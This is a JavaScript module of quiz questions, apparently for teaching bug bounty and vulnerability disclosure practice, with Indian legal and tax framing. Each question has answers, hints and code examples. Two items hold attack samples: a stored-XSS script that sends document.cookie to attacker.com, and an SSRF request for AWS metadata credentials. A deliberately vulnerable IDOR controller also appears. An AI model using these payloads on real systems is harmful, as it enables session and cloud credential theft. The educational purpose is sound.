const questions = [
  {
    question: "What is the fundamental difference between a 'Vulnerability Disclosure Program' (VDP) and a 'Bug Bounty Program'?",
    shortAnswer: "A VDP provides a safe, legally protected channel for researchers to report vulnerabilities for recognition (Hall of Fame) without cash rewards; a Bug Bounty Program pays monetary rewards for valid, in-scope security bugs.",
    explanation: "Every modern enterprise should maintain a VDP (often published via `security.txt`) to give external ethical hackers a clear, authorized path to report accidental discoveries without fear of prosecution. A Bug Bounty Program takes this further by incentivizing global researchers with financial payouts (ranging from ₹5,000 to ₹10,00,000+ per valid bug) managed via platforms like HackerOne or Bugcrowd.",
    hint: "Contrast a public reporting mailbox that awards recognition versus a paid reward program that pays money for bugs.",
    level: "basic",
    codeExample: `// VDP vs Bug Bounty Comparison:
Vulnerability Disclosure Program (VDP): "See Something, Say Something" → Recognition & Hall of Fame
Bug Bounty Program:                     Incentivized Crowdsourced Hacking → Cash Payouts in ₹ INR`
  },
  {
    question: "What is RFC 9116 (`security.txt`), and why is it considered the global standard for machine-readable vulnerability disclosure?",
    shortAnswer: "A standardized plaintext file hosted at `/.well-known/security.txt` that provides security researchers with official contact emails, PGP public keys, policy links, and preferred languages.",
    explanation: "Before RFC 9116, ethical hackers discovering severe zero-days often struggled to find responsible security contacts, resorting to random Twitter DMs or generic `info@` email addresses. RFC 9116 standardizes a plaintext configuration file placed at `https://domain.com/.well-known/security.txt` containing direct security team emails, PGP encryption keys, disclosure policy links, and expiration timestamps.",
    hint: "Recall the standardized plaintext file placed in the `/.well-known/` directory that tells hackers how to report vulnerabilities.",
    level: "basic",
    codeExample: `// Standard RFC 9116 security.txt Example:
Contact: mailto:security@kolkata-fintech.co.in
Encryption: https://kolkata-fintech.co.in/pgp-key.txt
Policy: https://kolkata-fintech.co.in/disclosure-policy
Preferred-Languages: en, bn, hi
Canonical: https://kolkata-fintech.co.in/.well-known/security.txt
Expires: 2027-12-31T23:59:59.000Z`
  },
  {
    question: "What is 'Scope' in a Bug Bounty Program, and why is testing 'Out-of-Scope' assets a critical legal violation?",
    shortAnswer: "The exact list of domain names, IP CIDR ranges, and mobile applications authorized for testing; probing out-of-scope assets forfeits legal safe harbor and constitutes unauthorized access under IT Act Section 66.",
    explanation: "A Bug Bounty policy strictly defines what is permitted. In-scope assets might include `api.bank.com` and the Android app, while out-of-scope assets might include `third-party-helpdesk.bank.com` or corporate office IP addresses. Testing an out-of-scope asset immediately invalidates safe harbor protections, disqualifies the researcher from bounties, and exposes them to criminal prosecution under computer misuse statutes.",
    hint: "Think about the explicit list of target websites that the company has authorized you to test.",
    level: "basic",
    codeExample: `// Bug Bounty Scope Specification:
[ IN-SCOPE (Authorized) ]:
- https://api.kolkata-fintech.co.in/* (REST Endpoints)
- Android App: com.fintech.kolkata.prod

[ OUT-OF-SCOPE (FORBIDDEN) ]:
- Any physical corporate office in Kolkata
- Social Engineering / Phishing of internal employees
- Third-party SaaS payment gateways (e.g., Zendesk / Salesforce)`
  },
  {
    question: "What are the core steps of the End-to-End Bug Bounty Report Lifecycle?",
    shortAnswer: "1. Discovery & PoC, 2. Report Submission, 3. Triaging & Validation, 4. Internal Developer Remediation, 5. Bounty Award in ₹ INR, 6. Coordinated Public Disclosure.",
    explanation: "When an ethical hacker finds a flaw: 1. They create a non-destructive Proof-of-Concept; 2. Submit a clear report via a platform; 3. Platform security analysts triage the report to verify exploitability and check for duplicates; 4. The enterprise security engineering squad patches the vulnerability; 5. The company awards the financial bounty; 6. After the patch is live in production, coordinated public disclosure occurs.",
    hint: "Follow the path from finding a bug to receiving the reward and disclosing it publicly.",
    level: "moderate",
    codeExample: `// Bug Bounty Report Lifecycle:
Researcher Discovers Flaw → Submits Report → Triage Team Verifies → Engineers Patch → Bounty Paid (₹) → Public Disclosure`
  },
  {
    question: "What is the 'Vulnerability Rating Taxonomy' (VRT) used by platforms like Bugcrowd and HackerOne?",
    shortAnswer: "A standardized baseline classifying vulnerabilities into five severity tiers (P1-Critical to P5-Informational) to eliminate ambiguity in bounty payout calculations.",
    explanation: "To prevent disputes between researchers and companies regarding reward amounts, the Vulnerability Rating Taxonomy (VRT) standardizes bug classifications: P1 - Critical (RCE, SQLi, SSRF on internal cloud metadata); P2 - High (Stored XSS on financial dashboard, IDOR exposing sensitive PII); P3 - Medium (CSRF on email change, Reflected XSS); P4 - Low (Open redirect, Clickjacking); P5 - Informational (Best-practice suggestions).",
    hint: "Remember the P1 to P5 classification system that standardizes vulnerability severity.",
    level: "moderate",
    codeExample: `// VRT Severity & Payout Tier (Indian Tech FinTech Standards):
P1 (Critical): Remote Code Execution (RCE)        → ₹2,50,000 - ₹10,00,000
P2 (High):     Critical IDOR / Stored XSS          → ₹75,000 - ₹2,00,000
P3 (Medium):   CSRF on State-Changing Action       → ₹20,000 - ₹60,000
P4 (Low):      Open URL Redirect                   → ₹5,000 - ₹15,000
P5 (Info):     Missing Security Header             → ₹0 (Informational / Closed)`
  },
  {
    question: "What is 'Server-Side Request Forgery' (SSRF), and why does extracting AWS EC2 Cloud Metadata (`http://169.254.169.254/`) warrant maximum P1 Critical bounties?",
    shortAnswer: "An attack forcing a backend server to make unauthorized HTTP requests; accessing the link-local metadata IP extracts temporary AWS IAM root credentials, compromising the entire cloud infrastructure.",
    explanation: "When a backend server fetches user-supplied URLs without validation, an attacker can input `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The vulnerable server queries its internal AWS hypervisor, returning temporary AWS access keys, secret keys, and session tokens, allowing the attacker to assume full administrative control of the enterprise AWS cloud account.",
    hint: "Think about tricking a backend server into fetching cloud credentials from the magic link-local IP 169.254.169.254.",
    level: "expert",
    codeExample: `// SSRF AWS Cloud Metadata Extraction:
POST /api/generate-pdf-from-url
Host: vulnerable-bank.in
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role"}

// Response Body Returns AWS Root IAM Keys:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
  "Token": "IQoJb3JpZ2luX2VjEPH..."
}`
  },
  {
    question: "What is 'Responsible Vulnerability Disclosure Program' (RVDP) operated by India's National Critical Information Infrastructure Protection Centre (NCIIPC)?",
    shortAnswer: "The statutory Indian government platform allowing security researchers to responsibly report vulnerabilities in national critical infrastructure (power, banking, defense, telecom) for national defense.",
    explanation: "Operated under Section 70A of the IT Act 2000, the NCIIPC RVDP provides an official portal for Indian cybersecurity researchers to report vulnerabilities in critical national sectors. Validated submissions are remediated with the asset owner, and researchers receive official Government of India Certificates of Appreciation and placement on the National RVDP Hall of Fame.",
    hint: "Remember the official Indian government portal run by NCIIPC to report vulnerabilities in critical infrastructure.",
    level: "basic",
    codeExample: `// NCIIPC RVDP Submission Workflow:
1. Ethical researcher identifies flaw in state electricity grid or bank portal.
2. Submits PGP-encrypted report to: rvdp@nciipc.gov.in
3. NCIIPC validates and coordinates remediation with asset owner.
4. Researcher honored on NCIIPC National Acknowledgement Wall.`
  },
  {
    question: "Why are 'Denial of Service' (DDoS) and 'Automated Mass Scanner Spam' explicitly prohibited in all enterprise bug bounty programs?",
    shortAnswer: "Because volumetric DDoS degrades live customer operations and automated tool output produces thousands of useless false positives, wasting engineering resources.",
    explanation: "Bug bounty programs exist to find subtle, high-impact business logic flaws, authorization bypasses, and zero-day vulnerabilities that automated scanners miss. Blasting a production bank with a 50 Gbps DDoS attack or running an automated Acunetix scan that submits 50,000 garbage contact forms causes production outages and floods triage queues with duplicate false positives.",
    hint: "Think about why firing an automated scanner that crashes a live banking server is banned in bug bounty.",
    level: "basic",
    codeExample: `// Universal Bug Bounty Disqualification Rule:
Prohibited Actions:
1. Volumetric Denial of Service (DDoS / Slowloris)
2. Automated scanner dumps without manual verification
3. Deleting or modifying other users' live production data`
  },
  {
    question: "What is 'Duplicate Report Resolution', and how do bug bounty platforms handle two researchers submitting the same vulnerability?",
    shortAnswer: "The 'First-to-Report' rule applies: the researcher whose timestamped submission arrived first receives 100% of the bounty; subsequent submissions are marked as duplicates with no payout.",
    explanation: "When a new software version introduces a vulnerability, multiple researchers worldwide may discover it independently. Bug bounty platforms strictly enforce the First-to-Report rule. The platform records cryptographic timestamps down to the millisecond. The first valid report receives the full bounty, while subsequent reports are marked as 'Duplicate'.",
    hint: "Think of the first-come, first-served rule in race conditions for vulnerability reports.",
    level: "basic",
    codeExample: `// Triage Timestamp Resolution:
Report #40921 (Researcher Mamata):   Submitted 10:14:02.140 UTC → STATUS: TRIAGED & PAID (₹1,50,000)
Report #40924 (Researcher Susmita):  Submitted 10:15:30.820 UTC → STATUS: DUPLICATE (₹0)`
  },
  {
    question: "What is 'Safe Harbor with DMCA Exemption' in modern bug bounty program policies?",
    shortAnswer: "A corporate commitment not to bring legal claims under anti-circumvention provisions of the DMCA or computer crime laws against researchers who bypass technical security controls in good faith.",
    explanation: "Section 1201 of the US Digital Millennium Copyright Act (DMCA) and international equivalents make it illegal to circumvent technical protection measures (like decrypting binary firmware). Safe Harbor agreements explicitly grant researchers permission to reverse-engineer client applications and bypass authentication controls, waiving DMCA anti-circumvention claims provided the research adheres to policy rules.",
    hint: "Think of the legal clause that protects reverse-engineers from copyright and anti-circumvention lawsuits.",
    level: "expert",
    codeExample: `// DMCA Safe Harbor Clause:
"We consider good-faith security research conducted under this policy to be exempt from the 
anti-circumvention restrictions of Section 1201 of the DMCA and Section 66 of the IT Act 2000."`
  },
  {
    question: "What is 'Broken Object-Level Authorization' (BOLA / IDOR), and why is it consistently the #1 most frequently awarded bug on bug bounty platforms?",
    shortAnswer: "Failing to validate whether the logged-in user possesses legal authorization to access a specific resource ID, allowing User A to view User B's private account by modifying an ID parameter.",
    explanation: "In modern REST and GraphQL APIs, backend controllers often fetch objects directly from databases based on client-provided IDs without checking session ownership: e.g., changing `GET /api/user/1004/statement` to `/api/user/1005/statement` displays another citizen's bank statement. Because automated scanners cannot easily understand business logic, manual ethical hackers discover thousands of IDORs, earning massive High/Critical bounties.",
    hint: "Think about changing the number in the web link to view another user's private account records.",
    level: "moderate",
    codeExample: `// Vulnerable Node.js BOLA / IDOR Controller:
app.get('/api/v1/patient/:id/records', async (req, res) => {
    // BUG: Missing check: if (req.user.id !== req.params.id) return res.status(403);
    const medicalRecord = await db.findPatientById(req.params.id);
    res.json(medicalRecord);
});`
  },
  {
    question: "How does 'Coordinated Vulnerability Disclosure' (CVD) enforce a standard 90-day remediation window before public disclosure?",
    shortAnswer: "The researcher privately notifies the vendor and agrees not to publish the vulnerability publicly for 90 days, giving the vendor adequate time to develop, test, and deploy a secure patch.",
    explanation: "CVD balances public security with engineering reality. Developed by Google Project Zero and CERT/CC, the 90-day rule gives software vendors three months to fix complex architectural flaws. If the vendor deploys the patch early, public disclosure can occur immediately. If the vendor remains unresponsive or refuses to patch after 90 days, the researcher is ethically permitted to publish the flaw to protect users.",
    hint: "Remember the standard 3-month (90-day) timeline giving companies time to fix bugs before public disclosure.",
    level: "basic",
    codeExample: `// 90-Day CVD Timeline:
Day 00: Researcher discovers zero-day → Submits private report to vendor.
Day 30: Vendor acknowledges flaw → Engineering squad begins code refactoring.
Day 75: Vendor deploys security patch to production cloud servers.
Day 90: Coordinated public disclosure blog post released simultaneously.`
  },
  {
    question: "What is 'Private Bug Bounty' versus 'Public Bug Bounty', and why do enterprises typically start with a private program?",
    shortAnswer: "Private programs invite only vetted, top-ranked researchers to test systems under a controlled environment; public programs are open to the entire global internet community.",
    explanation: "An enterprise launching a crowdsourced program rarely starts public. If an organization has unresolved low-hanging vulnerabilities, going public invites 50,000 researchers simultaneously, overwhelming the internal security squad with 500 reports a day. Enterprises start with a Private Program (inviting 50 elite researchers), remediate discovered flaws, and only transition to Public once their defensive posture is mature.",
    hint: "Compare an invite-only testing program with 50 top experts versus opening the doors to the entire internet.",
    level: "moderate",
    codeExample: `// Crowdsourced Maturity Path:
Phase 1: Internal Penetration Testing (Fix low-hanging fruit)
Phase 2: Private Bug Bounty (Invite 30 top-ranked HackerOne researchers)
Phase 3: Public Bug Bounty + RFC 9116 security.txt (Open to global research community)`
  },
  {
    question: "What is 'Cross-Site Scripting' (XSS), and what distinguishes Stored XSS from Reflected XSS in bug bounty severity rankings?",
    shortAnswer: "Stored XSS permanently saves malicious JavaScript in the server database (affecting every visitor who views the page); Reflected XSS requires tricking a victim into clicking a specially crafted URL.",
    explanation: "Stored XSS is classified as P2 (High Severity) because the payload is permanently stored in the database (e.g. in a user profile name or forum comment), executing automatically whenever any user or administrator views that record. Reflected XSS is classified as P3 (Medium Severity) because it is non-persistent and requires active phishing/social engineering to lure the victim to click an infected link.",
    hint: "Recall that Stored XSS lives permanently inside the database, while Reflected XSS only works when clicking an infected link.",
    level: "moderate",
    codeExample: `// Stored XSS Payload in Profile Bio:
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
// Impact: Steals admin session tokens automatically whenever the Admin User Review Panel loads!`
  },
  {
    question: "What is 'Vulnerability Chaining', and how do elite ethical hackers combine multiple low-severity bugs into a critical P1 exploit chain?",
    shortAnswer: "Combining multiple low or medium impact vulnerabilities (e.g., Open Redirect + CSRF + XSS + SSRF) in sequence to achieve full Remote Code Execution or Account Takeover.",
    explanation: "Individually, an Open Redirect might only be worth ₹5,000 (P4) and an unauthenticated CORS misconfiguration worth ₹15,000 (P3). Elite bug hunters chain them: using the CORS leak to steal a CSRF token, using the CSRF to trigger an internal SSRF request, and using the SSRF to extract AWS cloud IAM credentials, transforming three minor bugs into a ₹5,00,000 Critical P1 bounty.",
    hint: "Think about linking multiple small harmless dominoes together to knock over a massive security wall.",
    level: "expert",
    codeExample: `// Exploit Chain Progression:
Step 1 (P4 Low):    Open URL Redirect bypasses OAuth redirect_uri whitelist.
Step 2 (P3 Medium): Leaks OAuth Access Token in URL Fragment.
Step 3 (P2 High):   Uses stolen token to access internal Admin API.
Step 4 (P1 Critical): Admin API executes unvalidated shell command → Full Remote Code Execution!`
  },
  {
    question: "What constitutes a 'High-Quality Vulnerability Report', and why do clear reproduction steps accelerate bounty payments?",
    shortAnswer: "A professional markdown report containing an executive summary, step-by-step reproduction guide with HTTP requests, non-destructive PoC, realistic impact analysis, and exact source code remediation guidance.",
    explanation: "Triage engineers review hundreds of reports daily. A sloppy report saying 'your website is hacked' gets closed as informative. A high-quality report includes: 1. Accurate CVSS v3.1 vector; 2. Complete HTTP request/response text; 3. Non-destructive video or screenshot PoC; 4. Business impact explanation; 5. Specific code remediation patch. High-quality reports get triaged within hours and often receive bonus payouts.",
    hint: "Think of writing an airtight, professional engineering document that makes it easy for developers to fix the bug.",
    level: "basic",
    codeExample: `// High-Quality Report Structure:
1. Title: [IDOR] Unauthorized PII Disclosure on /api/v1/users/{id}
2. Severity: High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N - 6.5)
3. Steps to Reproduce: (Exact cURL commands)
4. Proof-of-Concept: (Screenshot showing sanitized test account data)
5. Impact: Allows any authenticated user to exfiltrate 500,000 customer phone numbers.
6. Remediation: Add authorization check 'if (session.userId !== targetId) return 403;'`
  },
  {
    question: "Under Indian Tax Laws, how are bug bounty earnings treated for independent ethical researchers?",
    shortAnswer: "Bug bounty payouts are treated as professional income from technical services and are subject to Indian Income Tax slabs, Tax Deducted at Source (TDS), and GST if crossing statutory thresholds.",
    explanation: "In India, rewards received from bug bounty platforms (whether paid in ₹ INR via bank transfer or $ USD via PayPal/Wise) are taxable as 'Profits and Gains of Business or Profession'. Full-time researchers filing taxes must declare bounty income, claim legitimate business deductions (laptops, internet, lab servers), and pay applicable advance taxes under the Income Tax Act, 1961.",
    hint: "Remember that bug bounty rewards are legally taxable professional income under Indian Income Tax law.",
    level: "moderate",
    codeExample: `// Indian Tax Compliance for Bug Bounty Hunters:
Classification: Professional Technical Income (Section 194J / Section 44ADA)
Deductions Allowed: Home office internet, computer hardware, testing software licenses
Advance Tax: Mandatory quarterly installment payments if annual tax liability exceeds ₹10,000`
  },
  {
    question: "What is 'Hall of Fame' recognition, and why is non-monetary recognition valuable for early-career cybersecurity students?",
    shortAnswer: "Public acknowledgement on a corporate or government security page honoring researchers who reported valid vulnerabilities; serves as verified proof of technical skill for job recruitment.",
    explanation: "For university students and junior researchers, earning a spot on the Google, Microsoft, Apple, NCIIPC, or Swiggy Security Hall of Fame provides indisputable, public proof of technical excellence. In technical job interviews, pointing to official corporate Hall of Fame listings proves hands-on offensive capability far more convincingly than standard paper resumes.",
    hint: "Think of an official public scoreboard of top ethical hackers published by tech giants and governments.",
    level: "basic",
    codeExample: `// Official Hall of Fame Acknowledgement Example:
"We would like to thank the following ethical security researchers for responsibly disclosing vulnerabilities:
1. Mamata (Kolkata, WB) - Critical Cloud SSRF Discovery
2. Debangshu (Barrackpore, WB) - Authentication Bypass Mitigation"`
  },
  {
    question: "Why must ethical researchers never access or download more data than the absolute minimum necessary to demonstrate a Proof-of-Concept (PoC)?",
    shortAnswer: "Exfiltrating excessive data violates legal safe harbor, crosses into criminal data theft under IT Act Section 66 / IPC 379, and exposes the researcher to civil lawsuit damages.",
    explanation: "To prove an SQL Injection or IDOR exists, viewing one record or retrieving `SELECT 1;` or the current user's profile is 100% sufficient. If a researcher dumps 500,000 patient records onto their personal laptop drive to 'prove it was real', they have committed mass data theft, invalidating their bug bounty safe harbor and creating criminal liability under the DPDP Act 2023 and IT Act 2000.",
    hint: "Think about why taking one photograph of an open bank vault proves it is unlocked, while stealing all the gold bars is a crime.",
    level: "expert",
    codeExample: `// The Ethical PoC Cardinal Rule:
VALID PROOF-OF-CONCEPT: Retrieve 1 test record → Stop immediately → Submit report.
CRIMINAL VIOLATION:      Dumping 500,000 live production customer records to local disk.`
  },
  {
    question: "Synthesizing the entire Vulnerability Disclosure & Bug Bounty landscape: how does crowdsourced security create a safer digital ecosystem for society?",
    shortAnswer: "By aligning global ethical talent through legal safe harbors and economic incentives, discovering and remediating thousands of zero-days before criminal cartels or hostile nation-states can exploit them.",
    explanation: "No single enterprise security team can anticipate every novel exploit technique. Crowdsourced security unites hundreds of thousands of ethical researchers worldwide, creating a continuous, distributed immune system for the internet. By establishing transparent VDPs, publishing RFC 9116 `security.txt` files, and rewarding valid findings in ₹ INR, organizations transform potential adversaries into collaborative allies, safeguarding national infrastructure and citizen privacy.",
    hint: "Conclude by recognizing how crowdsourced security harnesses global talent to defend our shared digital world.",
    level: "expert",
    codeExample: `// The Crowdsourced Defense Formula:
Global_Ethical_Talent + Legal_Safe_Harbors + Economic_Incentives_INR = CONTINUOUS IMMUNIZATION OF DIGITAL SOCIETY;`
  }
];

export default questions;
